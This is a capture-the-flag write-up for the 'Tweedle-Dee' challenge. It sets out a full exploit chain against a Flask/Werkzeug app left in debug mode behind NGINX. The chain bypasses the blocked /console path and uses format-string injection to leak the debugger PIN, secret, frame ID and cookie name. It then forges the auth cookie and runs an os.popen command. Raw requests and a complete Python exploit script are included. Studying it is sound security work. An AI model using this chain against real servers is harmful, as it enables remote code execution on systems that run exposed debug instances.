Tweedle-Dee CTF Challenge Writeup

Introduction

This challenge is a more complex version of the previous one (Tweedle-Dum). The source code is provided, and the setup includes:

.
├── docker-compose.yml
└── src
    ├── app
    │   ├── app.py
    │   ├── Dockerfile
    │   ├── static
    │   │   ├── style.css
    │   │   └── tweedle.png
    │   └── templates
    │       └── index.html
    └── nginx
        ├── Dockerfile
        └── nginx.conf

An NGINX server is configured to restrict certain endpoints. Here's the relevant content from nginx.conf:

worker_processes 4;
events {
    use epoll;
    worker_connections 128;
}
http {
    charset utf-8;
    access_log /dev/stdout combined;
    error_log /dev/stdout debug;
    real_ip_header X-Forwarded-For;
    real_ip_recursive on;
    set_real_ip_from 0.0.0.0/0;
    server {
        listen 2201;
        server_name _;
        location /console {
            return 403 "Bye";
        }
        location @error {
            return 500 "Bye";
        }
        location / {
            error_page 500 503 @error;
            proxy_intercept_errors on;
            proxy_pass http://app:5000;
        }
    }
}

The key restrictions are:
- /console endpoint returns 403 "Bye".
- Error stack traces are hidden via @error location.

The goal remains the same: Achieve Remote Code Execution (RCE) via the enabled debug mode in Werkzeug/Flask.

Part 1: Bypassing /console and Initial Recon

Reusing insights from the previous challenge, I examined the requests sent during debug interactions. Key requests include:

1. PIN authentication:
   GET /console?__debugger__=yes&cmd=pinauth&pin=415-333-840&s=Reqj7S50iZAVj97HzbW4 HTTP/1.1
   Host: tweedle-dum.france-cybersecurity-challenge.fr
   ...

2. Command execution after authentication:
   GET /console?&__debugger__=yes&cmd=__import__(%27os%27).popen(%27cat%20flag*%27).read()%3B&frm=0&s=Reqj7S50iZAVj97HzbW4 HTTP/1.1
   Host: tweedle-dum.france-cybersecurity-challenge.fr
   Cookie: __wzdf352e7b3f2a1e68a6bbc=1682640498|145ff1701ade
   ...

Authentication via PIN is required, followed by command submission in the cmd parameter.

Problems:
1. /console is blocked by NGINX.

From the Werkzeug debug source (e.g., here), the debug handler triggers on __debugger__=yes, regardless of the path. This means any endpoint can bypass the /console restriction.

Parameters needed:
- __debugger__=yes
- cmd=...
- frm=... (frame ID)
- s=... (secret)

Plus an authentication cookie (e.g., Cookie: __wzdf352e7b3f2a1e68a6bbc=1682640498|145ff1701ade).

The cookie is generated post-PIN auth:

if auth:
    rv.set_cookie(
        self.pin_cookie_name,
        f"{int(time.time())}|{hash_pin(pin)}",
        httponly=True,
        samesite="Strict",
        secure=request.is_secure,
    )

Where:

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

The cookie is derivable from the app's PIN.

2. Missing variables: cookie name, secret (s), frame ID (frm).

The secret is randomly generated:

self.secret = gen_salt(20)

Where gen_salt uses secrets.choice for randomness.

No direct access to DebuggedApplication instance.

Solution: Extracting Values via Thread Inspection

Using format string vulnerabilities or similar injection in User-Agent (as in previous challenge), enumerate loaded modules:

{ua.__class__.__init__.__globals__[t].sys.modules}

This reveals modules like threading.

Flask runs on a thread looping forever (from werkzeug.serving.run_simple):

srv.serve_forever()

Locate the server thread in threading._active:

{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active}

Example output (thread ID varies):

Thread ID -> 139822794656568

Then access app properties via the thread's target:

{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[139822794656568]._target.__self__.app.pin}
- PIN: 130-511-916

{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[139822794656568]._target.__self__.app.secret}
- Secret: qVxa6ZuktKRrQpXb30vE

{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[139822794656568]._target.__self__.app.frames}
- Frames dictionary: 139822799546272 (use a key from this dict as frm)

{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[139822794656568]._target.__self__.app.pin_cookie_name}
- Cookie name: __wzdc1a7d45eec759afe0ac3

Hash the PIN:

xxxxxxxx = first 12 chars of sha1("130-511-916 added salt") -> 7241e9ba7ea8

Forge cookie:

Cookie: __wzdc1a7d45eec759afe0ac3=1764663774|7241e9ba7ea8  (use current timestamp)

Exploit Final

The exploit involves:
1. Extract thread ID.
2. Extract PIN, secret, frame ID, cookie name.
3. Forge authentication cookie.
4. Send RCE request.

Here's the Python script:

import requests
import hashlib
import time

# Your values (extracted via injections)
pin = "130-511-916"
secret = "qVxa6ZuktKRrQpXb30vE"
frame_id = "139822799546272"
cookie_name = "__wzdc1a7d45eec759afe0ac3"
url = "http://localhost:8000"  # Replace with remote URL if needed

# Calculate hash
hash_value = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
print(f"Hash: {hash_value}")

# Create cookie value
cookie_value = f"{int(time.time())}|{hash_value}"
print(f"Cookie value: {cookie_value}")

# Prepare request
params = {
    "__debugger__": "yes",
    "cmd": "__import__('os').popen('cat flag*').read()",
    "frm": frame_id,
    "s": secret
}
headers = {
    "Cookie": f"{cookie_name}={cookie_value}"
}

# Send request
response = requests.get(url, params=params, headers=headers)
print(f"Status: {response.status_code}")
print(f"Response:\n{response.text}")

Response:

Status: 200
Response:
>>> __import__('os').popen('cat flag*').read()
<span class="string">'FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2<span class="extended">}\n'</span></span>

Flag: FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2}